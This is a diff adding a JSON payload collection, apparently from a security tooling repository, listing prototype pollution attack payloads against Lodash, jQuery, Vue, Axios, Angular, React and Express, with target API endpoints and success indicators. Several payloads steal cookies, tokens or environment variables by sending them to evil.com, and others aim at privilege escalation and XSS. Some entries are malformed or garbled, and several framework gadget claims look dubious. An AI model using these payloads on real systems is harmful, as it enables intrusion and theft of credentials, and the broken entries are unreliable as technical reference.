@@ -1,0 +1,322 @@
+{
+  "info": {
+    "name": "Prototype Pollution Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "Prototype Pollution attack payloads targeting Lodash, jQuery, Vue, Axios, and other JavaScript frameworks. 2026 Edition.",
+    "category": "JavaScript",
+    "severity": "HIGH",
+    "owasp": "A03:2021 - Injection",
+    "references": ["CVE-2019-10744", "CVE-2020-8203", "CVE-2022-0511"]
+  },
+  "philosophy": "Each payload targets specific JavaScript framework gadgets. Understanding the framework is key to exploitation.",
+  "payloads": {
+    "basic_pollution": [
+      {
+        "payload": "{\"__proto__\": {\"polluted\": true}}",
+        "description": "Classic __proto__ pollution",
+        "context": "JSON/merge",
+        "indicator": "Object.prototype.polluted === true"
+      },
+      {
+        "payload": "{\"constructor\": {\"prototype\": {\"polluted\": true}}}",
+        "description": "Constructor prototype pollution",
+        "context": "JSON/merge",
+        "indicator": "Object.constructor.prototype.polluted === true"
+      },
+      {
+        "payload": "{\"__proto__\": null}",
+        "description": "Pollute prototype to null",
+        "context": "JSON/merge",
+        "indicator": "obj.constructor === null"
+      },
+      {
+        "payload": "{\"__proto__\": {\"isAdmin\": true}}",
+        "description": "Privilege escalation via prototype",
+        "context": "JSON/merge",
+        "indicator": "{}.isAdmin === true"
+      },
+      {
+        "payload": "{\"__proto__\": {\"constructor\": {\"prototype\": {\"admin\": true}}}}",
+        "description": "Deep constructor pollution",
+        "context": "JSON/merge",
+        "indicator": "admin access"
+      }
+    ],
+    "lodash_gadgets": [
+      {
+        "payload": "{\"__proto__\": {\"isAdmin\": true}}",
+        "description": "Lodash merge pollutes prototype",
+        "context": "Lodash.merge, merge, cloneDeep",
+        "indicator": "Object.isAdmin === true",
+        "framework": "lodash"
+      },
+      {
+        "payload": "{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}",
+        "description": "Lodash deep merge pollution",
+        "context": "Lodash.mergeDeep, defaultsDeep",
+        "indicator": "Constructor.prototype.isAdmin === true",
+        "framework": "lodash"
+      },
+      {
+        "payload": "{\"__proto__\": {\"role\": \"admin\"}}",
+        "description": "Lodash defaults pollution",
+        "context": "Lodash.defaults, defaultsDeep",
+        "indicator": "Object.role === 'admin'",
+        "framework": "lodash"
+      },
+      {
+        "payload": "{\"__proto__\": {\"canAccess\": true}}",
+        "description": "Lodash set pollution",
+        "context": "Lodash.set, setWith",
+        "indicator": "Object.canAccess === true",
+        "framework": "lodash"
+      },
+      {
+        "payload": "{\"__proto__\": {\"templateSettings\": {\"evaluate\": \"/.*/gi\"}}}",
+        "description": "Lodash template settings pollution (XSS)",
+        "context": "Lodash.template",
+        "indicator": "Template execution vulnerability",
+        "framework": "lodash",
+        "severity": "CRITICAL"
+      },
+      {
+        "payload": "{\"__proto__\": {\"iteratee\": \"constructor\"}}",
+        "description": "Lodash iteratee pollution",
+        "context": "Lodash map, filter, find",
+        "indicator": "Function execution as string",
+        "framework": "lodash"
+      },
+      {
+        "payload": "{\"__proto__\": {\"sourceURL\": \"\\nconsole.log(process.env)\"}}",
+        "description": "Lodash sourceURL pollution (code injection)",
+        "context": "Lodash template with sourceURL",
+        "indicator": "Environment variable access",
+        "framework": "lodash",
+        "severity": "CRITICAL"
+      },
+      {
+        "payload": "{\"__proto__\": {\"exports\": {\"isBuffer\": true}}}",
+        "description": "Lodash isBuffer pollution",
+        "context": "Lodash utilities",
+        "indicator": "Type confusion",
+        "framework": "lodash"
+      }
+    ],
+    "jquery_gadgets": [
+      {
+        "payload": "{\"__proto__\": {\"readyFunction\": \"console.log(document.cookie)\"}}",
+        "description": "jQuery $.extend pollution - ready function XSS",
+        "context": "jQuery $.extend, $.parseHTML",
+        "indicator": "Arbitrary function execution",
+        "framework": "jquery"
+      },
+      {
+        "payload": "{\"__proto__\": {\"html\": \"<img src=x onerror=alert(1)>\", \"validate\": {\"required\": true}}}",
+        "description": "jQuery validation bypass",
+        "context": "jQuery Validate plugin",
+        "indicator": "Validation bypass",
+        "framework": "jquery"
+      },
+      {
+        "payload": "{\"__proto__\": {\"eventType\": \"load\", \"handleObj\": {\"type\": \"load\"}, \"delegateTarget\": \"<img src=x onerror=alert(1)>\"}}",
+        "description": "jQuery event handling pollution",
+        "context": "jQuery delegated events",
+        "indicator": "Event handler XSS",
+        "framework": "jquery"
+      },
+      {
+        "payload": "{\"__proto__\": {\"ajaxSettings\": {\"url\": \"http://evil.com/log?c=\" + document.cookie}}}",
+        "description": "jQuery ajax settings pollution",
+        "context": "jQuery.ajax",
+        "indicator": "Cookie theft",
+        "framework": "jquery",
+        "severity": "CRITICAL"
+      },
+      {
+        "payload": "{\"__proto__\": {\"fn\": {\"jquery\": \"<script>alert(1)</script>\"}}}",
+        "description": "jQuery fn namespace pollution",
+        "context": "jQuery plugins",
+        "indicator": "Plugin pollution",
+        "framework": "jquery"
+      }
+    ],
+    "vue_gadgets": [
+      {
+        "payload": "{\"__proto__\": {\"currentRoute\": {\"path\": \"../../../etc/passwd\"}}}",
+        "description": "Vue Router pollution",
+        "context": "Vue.js SPA routing",
+        "indicator": "Path traversal",
+        "framework": "vue"
+      },
+      {
+        "payload": "{\"__proto__\": {\"$refs\": {\"input\": {\"value\": \"compromised\"}}}}",
+        "description": "Vue refs pollution",
+        "context": "Vue.js refs manipulation",
+        "indicator": "Form value manipulation",
+        "framework": "vue"
+      },
+      {
+        "payload": "{\"__proto__\": {\"isServer\": true}}",
+        "description": "Vue SSR mode pollution",
+        "context": "Vue.js SSR applications",
+        "indicator": "Server-side execution",
+        "framework": "vue"
+      },
+      {
+        "payload": "{\"__proto__\": {\"$route\": {\"query\": {\"__proto__\": {\"admin\": true}}}}}",
+        "description": "Vue route query pollution",
+        "context": "Vue Router query params",
+        "indicator": "Query pollution",
+        "framework": "vue"
+      },
+      {
+        "payload": "{\"__proto__\": {\"render\": \"function(h){h('script').text('alert(1)')}\"}}",
+        "description": "Vue render function pollution (XSS)",
+        "context": "Vue.js render functions",
+        "indicator": "Arbitrary render",
+        "framework": "vue",
+        "severity": "CRITICAL"
+      }
+    ],
+    "axios_gadgets": [
+      {
+        "payload": "{\"__proto__\": {\"baseURL\": \"http://evil.com\"}}",
+        "description": "Axios baseURL pollution",
+        "context": "Axios HTTP requests",
+        "indicator": "Request redirected to attacker",
+        "framework": "axios",
+        "severity": "HIGH"
+      },
+      {
+        "payload": "{\"__proto__\": {\"headers\": {\"x-csrf-token\": \"attacker-token\"}}}",
+        "description": "Axios headers pollution",
+        "context": "Axios request headers",
+        "indicator": "CSRF token bypass",
+        "framework": "axios"
+      },
+      {
+        "payload": "{\"__proto__\": {\"withCredentials\": true}}",
+        "description": "Axios credentials pollution",
+        "context": "Axios withCredentials",
+        "indicator": "Cross-origin credentials leakage",
+        "framework": "axios",
+        "severity": "HIGH"
+      },
+      {
+        "payload": "{\"__proto__\": {\"onUploadProgress\": \"fetch('http://evil.com?c='+localStorage.getItem('token'))\"}}",
+        "description": "Axios progress callback pollution",
+        "context": "Axios upload hooks",
+        "indicator": "Token exfiltration",
+        "framework": "axios",
+        "severity": "CRITICAL"
+      }
+    ],
+    "object_assign_pollution": [
+      {
+        "payload": "{\"__proto__\": {\"isAdmin\": true}}",
+        "description": "Object.assign pollution",
+        "context": "Object.assign merge",
+        "indicator": "Admin access",
+        "framework": "native"
+      },
+      {
+        "payload": "{\"__proto__\": {\"constructor\": {\"prototype\": {\"query\": \"SELECT * FROM users\"}}}}",
+        "description": "Object.assign constructor pollution",
+        "context": "Object.assign deep merge",
+        "indicator": "Query injection",
+        "framework": "native"
+      },
+      {
+        "payload": "{\"__proto__\": {\"__proto__\": {\"polluted\": true}}}",
+        "description": "Double __proto__ pollution",
+        "context": "Nested object merge",
+        "indicator": "Prototype chain pollution",
+        "framework": "native"
+      }
+    ],
+    "angular_gadgets": [
+      {
+        "payload": "{\"__proto__\": {\"__ngContext__\": {\"cdk面上的\": \"constructor\"}}}",
+        "description": "Angular context pollution",
+        "context": "Angular applications",
+        "indicator": "Component access",
+        "framework": "angular"
+      },
+      {
+        "payload": "{\"constructor\": {\"prototype\": {\"__ngContext__\": \"<img src=x onerror=alert(1)>\"|}}}",
+        "description": "Angular template injection",
+        "context": "Angular templates",
+        "indicator": "SSTI/XSS",
+        "framework": "angular",
+        "severity": "CRITICAL"
+      }
+    ],
+    "react_gadgets": [
+      {
+        "payload": "{\"__proto__\": {\"props\": {\"isAdmin\": true}}}",
+        "description": "React props pollution",
+        "context": "React component manipulation",
+        "indicator": "Props injection",
+        "framework": "react"
+      },
+      {
+        "payload": "{\"__proto__\": {\"state\": {\"isAdmin\": true}}}",
+        "description": "React state pollution",
+        "context": "React state manipulation",
+        "indicator": "State injection",
+        "framework": "react"
+      }
+    ],
+    "express_gadgets": [
+      {
+        "payload": "{\"__proto__\": {\"settings\": {\"trust proxy\": \"loopback\"}}}",
+        "description": "Express trust proxy bypass",
+        "context": "Express.js applications",
+        "indicator": "IP spoofing",
+        "framework": "express"
+      },
+      {
+        "payload": "{\"__proto__\": {\"view cache\": true}}",
+        "description": "Express view cache manipulation",
+        "context": "Express.js view engine",
+        "indicator": "Template cache poisoning",
+        "framework": "express"
+      }
+    ],
+    "common_api_endpoints": [
+      "/api/merge",
+      "/api/extend",
+      "/api/update",
+      "/api/patch",
+      "/api/config",
+      "/api/settings",
+      "/api/preferences",
+      "/api/profile",
+      "/api/user",
+      "/api/object",
+      "/api/data"
+    ],
+    "exploitation_scenarios": {
+      "privilege_escalation": {
+        "description": "Pollute user object with admin properties",
+        "example": "{\"__proto__\": {\"role\": \"admin\", \"isAdmin\": true}}"
+      },
+      "dos": {
+        "description": "Pollute Object to cause runtime errors",
+        "example": "{\"__proto__\": {\"toString\": null}}"
+      },
+      "xss": {
+        "description": "Pollute prototype to inject XSS via template/eval",
+        "example": "{\"__proto__\": {\"constructor\": {\"prototype\": {\"toString\": \"alert(1)\"}}}}"
+      }
+    },
+    "success_indicators": [
+      "Object.polluted === true",
+      "obj.isAdmin === true",
+      "admin access granted",
+      "XSS executed",
+      "Prototype chain modified"
+    ]
+  }
+}
